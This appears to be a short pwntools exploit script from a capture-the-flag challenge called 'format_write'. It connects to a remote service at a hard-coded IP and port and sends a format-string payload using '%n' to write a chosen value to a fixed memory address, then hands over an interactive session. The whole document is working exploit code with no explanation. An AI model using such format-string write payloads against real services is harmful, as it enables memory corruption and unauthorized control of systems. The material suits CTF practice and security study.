import pwn

#p = pwn.gdb.debug("./format_write")
p = pwn.remote("107.178.209.165",5337)
p.sendafter("name: ",b"%4919u%8$nAAAAAA\x6c\x40\x40")
p.interactive()
